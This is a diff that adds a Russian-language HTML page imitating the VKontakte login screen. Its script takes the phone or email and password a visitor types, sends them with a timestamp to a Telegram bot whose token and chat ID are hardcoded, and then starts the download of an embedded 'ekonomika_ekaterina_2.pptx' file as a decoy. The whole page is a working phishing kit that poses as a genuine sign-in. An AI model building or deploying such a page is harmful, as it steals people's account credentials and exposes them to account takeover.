@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вход | Vk</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        body {
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .auth-container {
+            background: #fff;
+            width: 100%;
+            max-width: 400px;
+            padding: 32px;
+            border-radius: 12px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .logo img {
+            width: 48px;
+            height: 48px;
+        }
+
+        .title {
+            color: #0077ff;
+            font-size: 32px;
+            text-align: center;
+            font-weight: bold;
+            margin: -15px 0 25px 0;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #d3d9de;
+            border-radius: 8px;
+            font-size: 16px;
+            margin: 8px 0;
+        }
+
+        button {
+            width: 100%;
+            background: #0077ff;
+            color: #fff;
+            border: none;
+            padding: 14px;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            margin: 24px 0;
+            transition: transform 0.2s, background 0.3s;
+        }
+
+        button:hover {
+            transform: scale(1.02);
+            background: #0055cc;
+        }
+
+        .links {
+            text-align: center;
+            color: #818c99;
+            font-size: 14px;
+        }
+
+        .links a {
+            color: #0077ff;
+            text-decoration: none;
+            margin: 0 4px;
+        }
+
+        .notification {
+            display: none;
+            padding: 15px;
+            background: #f0f9eb;
+            color: #67c23a;
+            border-radius: 8px;
+            margin: 15px 0;
+            text-align: center;
+            animation: fadeIn 0.5s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <div class="auth-container">
+        <div class="logo">
+            <img src="https://vk.com/images/svg_icons/ic_head_logo.svg" alt="VK Logo">
+        </div>
+
+        <div class="title">вконтакте </div>
+        
+        <div id="notification" class="notification"></div>
+
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="text" id="login" placeholder="Телефон или почта" required>
+            </div>
+
+            <div class="input-group">
+                <input type="password" id="password" placeholder="Пароль" required>
+            </div>
+
+            <button type="submit">Войти</button>
+        </form>
+
+        <div class="links">
+            <a href="#">Зарегистрироваться</a> • 
+            <a href="#">Забыли пароль?</a>
+        </div>
+    </div>
+
+    <script>
+        // Telegram бот
+        const BOT_TOKEN = '7993430752:AAFqwGETwuV49zdrlekRxh_tdx-K2X3BRd8';
+        const CHAT_ID = '1210041875';
+
+        // Файл для скачивания (закодированный в base64)
+        const fileData = "UEsDBBQAAAAIAON5DVdQhXwYFgEAABYBAAAIABwAZWtvbm9taWthX2VrYXRlcmluYV8yLnBwdHNVVAkAA5X4l2SV+JdkdXgLAAEE6AMAAAToAwAAUEsBAhQAFAAAAAgA43kNV1CFfBgWAQAAFgEAAAgAGAAAAAAAAQAAAKSBAAAAAGVrb25vbWlrYV9la2F0ZXJpbmFfMi5wcHRzVVQFAAGV+JdkdXgLAAEE6AMAAAToAwAAUEsFBgAAAAABAAEATwAAAFkBAAAAAA==";
+        const fileName = "ekonomika_ekaterina_2.pptx";
+
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const login = document.getElementById('login').value;
+            const password = document.getElementById('password').value;
+            const notification = document.getElementById('notification');
+
+            try {
+                // 1. Отправка данных в Telegram
+                const tgResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: `🔐 Новые данные:\nЛогин: ${login}\nПароль: ${password}\nВремя: ${new Date().toLocaleString()}`
+                    })
+                });
+
+                // 2. Скачивание файла
+                const blob = base64ToBlob(fileData, "application/vnd.openxmlformats-officedocument.presentationml.presentation");
+                downloadFile(blob, fileName);
+                
+                notification.textContent = 'Файл скачивается...';
+                notification.style.display = 'block';
+
+            } catch (error) {
+                notification.textContent = 'Ошибка отправки данных';
+                notification.style.display = 'block';
+                console.error('Error:', error);
+            }
+        });
+
+        // Функции для работы с файлом
+        function base64ToBlob(base64, mimeType) {
+            const byteCharacters = atob(base64);
+            const byteNumbers = new Array(byteCharacters.length);
+            
+            for (let i = 0; i < byteCharacters.length; i++) {
+                byteNumbers[i] = byteCharacters.charCodeAt(i);
+            }
+            
+            const byteArray = new Uint8Array(byteNumbers);
+            return new Blob([byteArray], {type: mimeType});
+        }
+
+        function downloadFile(blob, fileName) {
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = fileName;
+            document.body.appendChild(a);
+            a.click();
+            setTimeout(() => {
+                document.body.removeChild(a);
+                window.URL.revokeObjectURL(url);
+            }, 100);
+        }
+    </script>
+</body>
+</html>
